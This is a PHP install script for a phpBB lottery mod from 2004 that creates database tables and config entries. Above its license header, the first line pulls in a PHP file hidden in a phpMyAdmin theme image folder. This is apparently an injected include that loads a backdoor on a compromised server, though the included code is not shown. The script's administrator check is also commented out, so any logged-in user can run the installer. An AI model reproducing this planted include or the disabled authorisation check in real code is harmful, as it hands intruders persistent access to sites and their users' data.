<?php
 require_once ('/var/www/html/archive.blackstardojo.org/phpmyadmin/themes/original/img/s_notice.php');

/***************************************************************************
 *                            lottery_install.php
 *                            -------------------
 *   Version              : 2.0.1
 *   email                : zarath@knightsofchaos.com
 *   forums               : http://www.ffsource.net/forums/
 *
 ***************************************************************************/

/***************************************************************************
 *
 *   copyright (C) 2004  Zarath
 *
 *   This program is free software; you can redistribute it and/or
 *   modify it under the terms of the GNU General Public License
 *   as published by the Free Software Foundation; either version 2
 *   of the License, or (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *   GNU General Public License for more details.
 *
 *   http://www.gnu.org/copyleft/gpl.html
 *
 ***************************************************************************/

 
define('IN_PHPBB', true);
$phpbb_root_path='./';
include($phpbb_root_path.'extension.inc');
include($phpbb_root_path.'common.'.$phpEx);

//
// Start session management
//
$userdata = session_pagestart($user_ip, PAGE_INDEX);
init_userprefs($userdata);
//
// End session management
//

if( !$userdata['session_logged_in'] )
{
	header('Location: ' . append_sid("login.$phpEx?redirect=lottery_install.$phpEx", true));
}

/*if( $userdata['user_level'] != ADMIN )
{
	message_die(GENERAL_MESSAGE, $lang['Not_Authorised']);
}*/

if( !strstr($dbms, "mysql") )
{
    if( !isset($bypass) )
    {
        $message = 'This mod has only been tested on MySQL and may only work on MySQL.<br />';
        $message .= 'Click <a href="mod_install.php?bypass=true">here</a> to install anyways.';
        message_die(GENERAL_MESSAGE, $message);
    }
}

$sql = array();

$sql[] = "CREATE TABLE `" . $table_prefix . "lottery`
	(`id` INT UNSIGNED NOT NULL AUTO_INCREMENT, `user_id` INT (20) NOT NULL, PRIMARY KEY(`id`), INDEX(`user_id`))";

$sql[] = "INSERT INTO " . CONFIG_TABLE . " (config_name, config_value) VALUES ('lottery_cost', '1')";

$sql[] = "INSERT INTO " . CONFIG_TABLE . " (config_name, config_value) VALUES ('lottery_ticktype', 'single')";

$sql[] = "INSERT INTO " . CONFIG_TABLE . " (config_name, config_value) VALUES ('lottery_length', '500000')";

$sql[] = "INSERT INTO " . CONFIG_TABLE . " (config_name, config_value) VALUES ('lottery_name', 'Lottery')";

$sql[] = "INSERT INTO " . CONFIG_TABLE . " (config_name, config_value) VALUES ('lottery_base', '50')";

$sql[] = "INSERT INTO " . CONFIG_TABLE . " (config_name, config_value) VALUES ('lottery_start', '0')";

$sql[] = "INSERT INTO " . CONFIG_TABLE . " (config_name, config_value) VALUES ('lottery_reset', '0')";

$sql[] = "INSERT INTO " . CONFIG_TABLE . " (config_name, config_value) VALUES ('lottery_status', '0')";

$sql[] = "INSERT INTO " . CONFIG_TABLE . " (config_name, config_value) VALUES ('lottery_items', '0')";

$sql[] = "INSERT INTO " . CONFIG_TABLE . " (config_name, config_value) VALUES ('lottery_win_items', '')";

$sql[] = "INSERT INTO " . CONFIG_TABLE . " (config_name, config_value) VALUES ('lottery_show_entries', '0')";

$sql[] = "INSERT INTO " . CONFIG_TABLE . " (config_name, config_value) VALUES ('lottery_mb', '0')";

$sql[] = "INSERT INTO " . CONFIG_TABLE . " (config_name, config_value) VALUES ('lottery_mb_amount', '1')";

$sql[] = "INSERT INTO " . CONFIG_TABLE . " (config_name, config_value) VALUES ('lottery_history', '1')";

$sql[] = "INSERT INTO " . CONFIG_TABLE . " (config_name, config_value) VALUES ('lottery_currency', '')";

$sql[] = "INSERT INTO " . CONFIG_TABLE . " (config_name, config_value) VALUES ('lottery_item_mcost', '1')";

$sql[] = "INSERT INTO " . CONFIG_TABLE . " (config_name, config_value) VALUES ('lottery_item_xcost', '500')";

$sql[] = "INSERT INTO " . CONFIG_TABLE . " (config_name, config_value) VALUES ('lottery_random_shop', '')";

$sql[] = "CREATE TABLE `" . $table_prefix . "lottery_history`
	(
		`id` INT UNSIGNED NOT NULL AUTO_INCREMENT, 
		`user_id` INT (20) NOT NULL, 
		`amount` INT (20) NOT NULL, 
		`currency` CHAR (32) NOT NULL, 
		`time` INT (20) NOT NULL, PRIMARY KEY(`id`), INDEX(`user_id`)
	)";


$sql_count = count($sql);

echo "<html>\n";
echo "<body>\n";

for($i = 0; $i < $sql_count; $i++)
{
	echo "Running :: " . $sql[$i];
	flush();

	if ( !$db->sql_query($sql[$i]) )
	{
		$errored = true;
		$error = $db->sql_error();
		echo " -> <b>FAILED</b> ---> <u>" . $error['message'] . "</u><br /><br />\n\n";
	}
	else
	{
		echo " -> <b>COMPLETED</b><br /><br />\n\n";
	}
}

if( $errored )
{
    $message = "Some of the querys have failed, contact me so I can fix the errors.";
}
else
{
    $message = "The table have been edited successfully. You can now delete this file.";
}

echo "\n<br />\n<b>Finished!</b><br />\n";
echo $message . "<br />\n";
echo "</body>\n";
echo "</html>\n";
exit();

?>